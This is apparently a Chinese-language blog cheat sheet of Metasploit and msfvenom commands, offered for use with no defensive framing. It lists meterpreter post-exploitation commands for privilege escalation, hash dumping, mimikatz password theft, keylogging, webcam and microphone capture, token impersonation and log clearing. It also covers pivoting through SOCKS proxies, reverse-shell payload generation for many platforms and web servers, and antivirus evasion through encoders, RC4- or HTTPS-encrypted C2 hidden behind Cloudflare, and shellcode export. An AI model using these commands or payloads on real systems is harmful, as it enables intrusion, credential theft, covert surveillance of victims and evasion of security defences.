---
title: msf & msfvenom 常用命令
date: 2021-11-24 12:08:49
tags: 
 - msfvenom
 - linux
---
## msf

### 常用命令

```bash
ps   进程
sysinfo 查看系统信息
route 查看路由表
run get_local_subnets 获得内网 ip 段情况
getwd/getpid/getuid 查看路径/shell id/当前用户
getsystem 一键提权
screenshot 截屏
background/sessions 配合
upload/download /root/test  c:\\   上传/下载文件
search -D c:\\ -f *.doc   -D 指定目录 –f 指定文件
edit 相当于vi 修改host等
run getgui -e 开启目标主机远程桌面
run getgui -u example_username -p example_password 可以添加账号以便利用
run arp_scanner -r x.x.x.x/24 扫描存活主机 linux下也可以fping   -asg   10.96.10.0/24  或namp
run service_manager –l 获取运行服务
rdesktop -u kali -p meterpreter 192.168.250.176:3389远程左面连接 
shell 获取cmd
keyscan_start/dump/stop 开启/输出/关闭 记录目标主机的键盘输入
run hashdump 打印账号密码hash&#xff0c;这个并不好&#xff0c;可以利用mimikatz
load mimikatz
	先migrate PID然后load mimikatz获取密码mimikatz_command -f sekurlsa::searchPasswords
也可以上传一个execute -i -f mimikatz.exe
	privilege::debug 提权
	sekurlsa::logonpasswords获取密码
portfwd命令 端口转发 portfwd add -l 1122 -p 3389 -r 192.168.250.176
migrate 端口 讲meterprete注入进程种结合ps使用
execute –f 相当于cmd中执行命令 –H 后台执行 –i交互式 
假冒域管理员等&#xff0c;use incognito然后查看list_tokens –u存在用户名 假冒impersonate_token 用户名(\\两个)
record_mic 记录麦克风
•  webcam_list 查看摄像头设备
•  从指定的摄像头&#xff0c;拍摄照片&#xff1a;webcam_snap  webcam_snap -i 1 -v false 每隔一秒拍摄一张图片
•  从指定的摄像头&#xff0c;开启视频&#xff1a;webcam_stream
run post/windows/gather/enum_applications  获取目标主机上的软
件安装信息
run post/windows/gather/enum_ie  读取IE 浏览器
cookies 等缓存信息。
run post/windows/gather/dumplinks 最近打开文档
run post/windows/gather/checkvm  是否虚拟机
clearev 清除痕迹
```

### 添加路由

```
添加命令：route  add  内网ip  子网掩码   session的id
打印命令：route  print
```

### 扫描内网

```
use auxiliary/scanner/portscan/tcp
```

### 创建快捷脚本

```
makerc <name>
```



### 端口转发

```
portfwd add -l 2222 -r 192.168 -p 3389  
```



### 使用其他协议反弹shell

```
use  windows/local/payload_inject
```



### pivot + socks5代理

```
route add 10.10.10.1 255.255.255.0 1
route print

use auxiliary/server/socks_proxy 
show options
run
```



### Socks5代理

```
export ALL_PROXY=socks5://127.0.0.1:1080
```



### 自动迁移

```
set AutoRunScript migrate -f  自动迁移进程
```



### Handlers

Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.

```command_linux
use exploit/multi/handler
set PAYLOAD <Payload name>
set LHOST <LHOST value>
set LPORT <LPORT value>
set ExitOnSession false
exploit -j -z  #后台持续监听
```

Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r ‘

同样，快捷启动

```
msfconsole -x "use exploits/multi/handler; set lhost IP; set lport 7777; set payload windows/x64/meterpreter/reverse_tcp_rc4;set RC4PASSWORD password; exploit"
```



## msfvenom

### 命令选项

```
Options:
-p, --payload 指定需要使用的payload。使用自定义的payload，请使用-;或者stdin指定
-l, --list  列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all
-n, --nopsled 为payload预先指定一个NOP滑动长度
-f, --format  指定输出格式
-e, --encoder 指定需要使用的编码
-a, --arch 指定payload的目标架构 x64 x86
–platform 指定payload的目标平台
-s, --space 设定有效攻击荷载的最大长度
-b, --bad-chars 设定规避字符集&#xff0c;比如: &#039;\x00\xff&#039;
-i, --iterations 指定payload的编码次数，绕杀毒
-c, --add-code 指定一个附加的win32 shellcode文件
-x, --template  指定一个自定义的可执行文件作为模板
-k, --keep 保护模板程序的动作，注入的payload作为一个新的进程运行
–payload-options 列举payload的标准选项
-o, --out  保存payload
-v, --var-name 指定一个自定义的变量，以确定输出格式
–shellest 最小化生成payload
```

### Binaries

Linux

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
```

Windows

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
```

Mac

```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
```

### Web Payloads

PHP

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

ASP

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
```

JSP

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
```

WAR

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
```

### Scripting Payloads

Python

```
msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py
```

Bash

```
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh
```

Perl

```
msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
```

### Shellcode

For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.

Linux Based Shellcode

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
```

Windows Based Shellcode

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
```

Mac Based Shellcode

```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
```



## 木马免杀

### 流量混淆

dns C2

```
待完善
```

https加密（可配合 cloudflare cdn使用，隐藏真实IP）

```
Cloudflare支持的HTTP端口是：

80,8080,8880,2052,2082,2086,2095

Cloudflare支持的HTTPs端口是：

443,2053,2083,2087,2096,8443
```

命令示例

```
msfvenom -p windows/x64/meterpreter/reverse_https  LHOST=IP LPORT=443  -f exe -o rc4_7777.exe
```

tcp协议 通过rc4加密

```
msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 RC4PASSWORD=set  LHOST=IP LPORT=7777  -f exe -o rc4_7777.exe
```

### 木马混淆

编码处理

```
msfvenom -p <payload> -e <encoder > -i <encoder times> -n <nopsled> -f <format> -o <path>
msfvenom -p windows/meterpreter/reverse_http -e x86/shikata_ga_nai -i 8 -b ‘\x00’ LHOST=192.168.1.48 LPORT=8080  -f raw -o /root/Desktop/Green_m.raw
```

导出 C代码，通过掩日生成exe免杀

```
msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 RC4PASSWORD=password  LHOST=IP LPORT=7777  -f c -o shell.c
```

